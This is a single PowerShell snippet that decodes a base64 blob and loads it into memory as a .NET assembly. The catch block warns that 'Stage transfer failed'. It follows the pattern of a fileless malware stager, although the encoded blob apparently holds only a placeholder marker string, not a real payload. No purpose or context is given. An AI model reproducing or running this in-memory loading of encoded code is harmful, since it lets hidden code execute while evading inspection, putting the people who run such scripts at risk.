
try { $StageBytes = [Convert]::FromBase64String("c3RhZ2UyLW1hcmtlcjpyZHA5ZW0yMjU2"); [Reflection.Assembly]::Load($StageBytes); $PSDefaultParameterValues["Out-File:Encoding"] = "utf8" } catch { Write-Warning "Stage transfer failed" }
